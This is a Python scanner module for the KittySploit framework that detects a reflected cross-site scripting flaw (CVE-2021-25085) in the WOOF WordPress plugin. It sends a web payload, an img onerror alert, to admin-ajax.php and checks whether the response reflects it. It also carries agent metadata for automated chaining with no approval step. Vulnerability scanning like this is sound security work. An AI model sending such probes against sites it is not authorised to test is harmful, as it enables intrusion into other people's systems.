#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""The WOOF WordPress plugin does not sanitize or escape the woof_redraw_elements parameter before reflecting it ."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'WOOF WordPress plugin - Cross-Site Scripting Detection',
        'description': 'The WOOF WordPress plugin does not sanitize or escape the woof_redraw_elements parameter before reflecting it back in an admin page, leading to a reflected cross-site scripting.',
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve', 'cve2021', 'wordpress', 'wp-plugin', 'wp', 'xss', 'wpscan', 'pluginus', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://wpscan.com/vulnerability/b7dd81c6-6af1-4976-b928-421ca69bfa90',
            'https://plugins.trac.wordpress.org/changeset/2648751',
            'https://nvd.nist.gov/vuln/detail/CVE-2021-25085',
            'https://github.com/ARPSyndicate/kenzer-templates',
        ],
        'cve': 'CVE-2021-25085',
    }

    def run(self):
        r = self.http_request(method="GET", path='/wp-admin/admin-ajax.php?action=woof_draw_products&woof_redraw_elements[]=<img%20src=x%20onerror=alert(document.domain)>', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
        body_any = ('"additional_fields":["<img src=x onerror=alert(document.domain)>"]}',)
        header_any = ('text/html',)
        if (any(m in body for m in body_any)) and (any(m in headers for m in header_any)):
            self.set_info(
                severity='medium',
                reason="WOOF WordPress plugin - Cross-Site Scripting detected",
                path='/wp-admin/admin-ajax.php?action=woof_draw_products&woof_redraw_elements[]=<img%20src=x%20onerror=alert(document.domain)>',
            )
            return True
        return False

